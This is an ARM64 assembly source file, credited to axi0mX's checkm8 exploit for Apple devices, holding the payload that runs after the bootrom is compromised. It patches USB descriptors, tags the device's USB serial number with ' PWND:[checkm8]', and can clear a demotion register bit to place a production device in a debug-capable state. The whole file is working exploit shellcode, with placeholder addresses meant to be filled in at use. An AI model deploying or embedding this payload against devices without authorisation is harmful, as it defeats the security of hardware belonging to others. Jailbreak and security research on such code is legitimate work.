// Code from the original checkm8 exploit by axi0mX
// https://github.com/axi0mX/ipwndfu
// This code has been relesed under the GPL v3

.text

.pool
.set SET_USBDescriptors,            0xbad00001
.set gUSBDescriptors,               0xbad00002
.set gUSBSerialNumber,              0xbad00003
.set usb_create_string_descriptor,  0xbad00004
.set gUSBSRNMStringDescriptor,      0xbad00005

.set demote_flag,                   0xbad00006
.set gDemotionRegister,             0xbad00007

.global _main
_main:
  mov   x19, #0                      // HACK: do not free this usb request
  stp   x29, x30, [sp,#-0x10]!
  mov   x29, sp

  ldr   x0, =SET_USBDescriptors
  cmp   x0, #1
  bne   _set_srnm                   // Do not set USB Descriptors anymore, this will cause a crash on t8011 (and maybe others)]

_set_USBDescriptors:
  LDR   X0, =gUSBDescriptors
  LDP   X0, X1, [X0]
  ADR   X2, USB_DESCRIPTOR
  LDP   X3, X4, [X2]
  STP   X3, X4, [X0]
  STP   X3, X4, [X1]
  LDP   X3, X4, [X2,#0x10]
  STP   X3, X4, [X0,#0x10]
  STP   X3, X4, [X1,#0x10]

_set_srnm:
  ldr   x0, =gUSBSerialNumber
_find_zero_loop:
  add   x0, x0, #1
  ldrb  w1, [x0]
  cbnz  w1, _find_zero_loop

  adr   x1, PWND_STRING
  ldp   x2, x3, [x1]
  stp   x2, x3, [x0]

  ldr   x0, =gUSBSerialNumber
  ldr   x1, =usb_create_string_descriptor
  blr   x1

  ldr   x1, =gUSBSRNMStringDescriptor
  strb  w0, [x1]

  ldr   x0, =demote_flag
  cmp   x0, #1
  bne   _end

_demotion:
  ldr   x1, =gDemotionRegister
  ldr   w0, [x1]
  tst   w0, #1
  beq   _end
  ldr   w0, [x1]
  and   w0, w0, #0xfffffffe
  str   w0, [x1]
  dsb   sy
  isb

_end:
  ic    iallu
  dsb   sy
  isb

  ldp   x29, x30, [sp], #0x10
  ret

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
